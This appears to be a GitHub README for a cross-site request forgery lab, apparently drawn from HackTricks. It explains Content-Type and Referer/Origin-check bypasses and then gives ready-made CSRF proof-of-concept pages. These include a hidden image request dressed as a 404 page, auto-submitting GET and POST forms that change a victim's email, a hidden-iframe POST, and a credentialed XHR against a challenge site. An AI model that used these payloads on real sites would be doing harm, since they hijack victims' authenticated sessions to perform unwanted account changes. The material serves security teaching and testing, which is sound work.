# Cross-Site-Request-Forgery-CSRF-Attack-Lab

<h3 dir="auto"><a id="user-content-content-type-change" class="anchor" aria-hidden="true" href="#content-type-change"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Content-Type change</h3>
<p dir="auto">According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests" rel="nofollow"><strong>this</strong></a>, in order to <strong>avoid preflight</strong> requests using <strong>POST</strong> method these are the allowed Content-Type values:</p>
<ul dir="auto">
<li><strong><code>application/x-www-form-urlencoded</code></strong></li>
<li><strong><code>multipart/form-data</code></strong></li>
<li><strong><code>text/plain</code></strong></li>
</ul>
<p dir="auto">However, note that the <strong>severs logic may vary</strong> depending on the <strong>Content-Type</strong> used so you should try the values mentioned and others like <strong><code>application/json</code></strong><em><strong>,</strong></em><strong><code>text/xml</code></strong>, <strong><code>application/xml</code></strong><em>.</em></p>
<h3 dir="auto"><a id="user-content-applicationjson-preflight-request-bypass" class="anchor" aria-hidden="true" href="#applicationjson-preflight-request-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>application/json preflight request bypass</h3>
<p dir="auto">As you already know, you cannot sent a POST request with the Content-Type <strong><code>application/json</code></strong> via HTML form, and if you try to do so via <strong><code>XMLHttpRequest</code></strong> a <strong>preflight</strong> request is sent first.<br>
However, you could try to send the JSON data using the content types **<code>text/plain</code> and <code>application/x-www-form-urlencoded</code> **just to check if the backend is using the data independently of the Content-Type.<br>
You can send a form using <code>Content-Type: text/plain</code> setting <strong><code>enctype="text/plain"</code></strong></p>
<p dir="auto">You could also try to <strong>bypass</strong> this restriction by using a <strong>SWF flash file</strong>. More more information <a href="https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937" rel="nofollow"><strong>read this post</strong></a>.</p>
<h3 dir="auto"><a id="user-content-referrer--origin-check-bypass" class="anchor" aria-hidden="true" href="#referrer--origin-check-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Referrer / Origin check bypass</h3>
<h4 dir="auto"><a id="user-content-avoid-referrer-header" class="anchor" aria-hidden="true" href="#avoid-referrer-header"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Avoid Referrer header</h4>
<p dir="auto">Some applications validate the Referer header when it is present in requests but <strong>skip the validation if the header is omitted</strong>.</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;meta name="referrer" content="never"&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<meta name=&quot;referrer&quot; content=&quot;never&quot;>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h4 dir="auto"><a id="user-content-regexp-bypasses" class="anchor" aria-hidden="true" href="#regexp-bypasses"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Regexp bypasses</h4>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre><code>https://hahwul.com (O)
https://hahwul.com?white_domain_com (O)
https://hahwul.com;white_domain_com (O)
https://hahwul.com/white_domain_com/../target.file (O)
https://white_domain_com.hahwul.com (O)
https://hahwulwhite_domain_com (O)
file://123.white_domain_com (X) 
https://white_domain_com@hahwul.com (X)
https://hahwul.com#white_domain_com (X)
https://hahwul.com\.white_domain_com (X)
https://hahwul.com/.white_domain_com (X)
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="https://hahwul.com (O)
https://hahwul.com?white_domain_com (O)
https://hahwul.com;white_domain_com (O)
https://hahwul.com/white_domain_com/../target.file (O)
https://white_domain_com.hahwul.com (O)
https://hahwulwhite_domain_com (O)
file://123.white_domain_com (X) 
https://white_domain_com@hahwul.com (X)
https://hahwul.com#white_domain_com (X)
https://hahwul.com\.white_domain_com (X)
https://hahwul.com/.white_domain_com (X)
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h2 dir="auto"><a id="user-content-exploit-examples" class="anchor" aria-hidden="true" href="#exploit-examples"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Exploit Examples</strong></h2>
<h3 dir="auto"><a id="user-content-exfiltrating-csrf-token" class="anchor" aria-hidden="true" href="#exfiltrating-csrf-token"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Exfiltrating CSRF Token</strong></h3>
<p dir="auto">If a <strong>CSRF token</strong> is being used as **defence **you could try to **exfiltrate it **abusing a <a href="/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/#xss-stealing-csrf-tokens"><strong>XSS</strong></a> vulnerability or a <a href="/carlospolop/hacktricks/blob/master/pentesting-web/dangling-markup-html-scriptless-injection.md"><strong>Dangling Markup</strong></a> vulnerability.</p>
<h3 dir="auto"><a id="user-content-get-using-html-tags" class="anchor" aria-hidden="true" href="#get-using-html-tags"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>GET using HTML tags</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;img src="http://google.es?param=VALUE" style="display:none" /&gt;
&lt;h1&gt;404 - Page not found&lt;/h1&gt;
The URL you are requesting is no longer available
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<img src=&quot;http://google.es?param=VALUE&quot; style=&quot;display:none&quot; />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Other HTML5 tags that can be used to automatically send a GET request are:</p>
<p>Screen Shoot is cross-site request forgery (csrf) attack lab</p>
<h3 dir="auto"><a id="user-content-form-get-request" class="anchor" aria-hidden="true" href="#form-get-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Form GET request</h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form method="GET" action="https://victim.net/email/change-email"&gt;
      &lt;input type="hidden" name="email" value="some@email.com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method=&quot;GET&quot; action=&quot;https://victim.net/email/change-email&quot;>
      <input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;some@email.com&quot; />
      <input type=&quot;submit&quot; value=&quot;Submit request&quot; />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-form-post-request" class="anchor" aria-hidden="true" href="#form-post-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Form POST request</h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://victim.net/email/change-email" id="csrfform"&gt;
      &lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt; &lt;!-- Way 1 to autosubmit --&gt;
      &lt;input type="submit" value="Submit request" /&gt;
      &lt;img src=x onerror="csrfform.submit();" /&gt; &lt;!-- Way 2 to autosubmit --&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit(); //Way 3 to autosubmit
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action=&quot;https://victim.net/email/change-email&quot; id=&quot;csrfform&quot;>
      <input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;some@email.com&quot; autofocus onfocus=&quot;csrfform.submit();&quot; /> <!-- Way 1 to autosubmit -->
      <input type=&quot;submit&quot; value=&quot;Submit request&quot; />
      <img src=x onerror=&quot;csrfform.submit();&quot; /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-form-post-request-through-iframe" class="anchor" aria-hidden="true" href="#form-post-request-through-iframe"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Form POST request through iframe</h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;!-- 
The request is sent through the iframe withuot reloading the page 
--&gt;
&lt;html&gt;
  &lt;body&gt;
  &lt;iframe style="display:none" name="csrfframe"&gt;&lt;/iframe&gt; 
    &lt;form action="/change-email" id="csrfform" target="csrfframe"&gt;
      &lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style=&quot;display:none&quot; name=&quot;csrfframe&quot;></iframe> 
    <form action=&quot;/change-email&quot; id=&quot;csrfform&quot; target=&quot;csrfframe&quot;>
      <input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;some@email.com&quot; autofocus onfocus=&quot;csrfform.submit();&quot; />
      <input type=&quot;submit&quot; value=&quot;Submit request&quot; />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-ajax-post-request" class="anchor" aria-hidden="true" href="#ajax-post-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Ajax POST request</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;script&gt;
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&amp;status=on");
&lt;/script&gt;

&lt;script&gt;
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&amp;param2=value2"
})
&lt;/script&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
  }
xh.withCredentials = true;
xh.open(&quot;POST&quot;,&quot;http://challenge01.root-me.org/web-client/ch22/?action=profile&quot;);
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send(&quot;username=abcd&amp;status=on&quot;);
</script>

<script>
//JQuery version
$.ajax({
  type: &quot;POST&quot;,
  url: &quot;https://google.com&quot;,
  data: &quot;param=value&amp;param2=value2&quot;
})
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
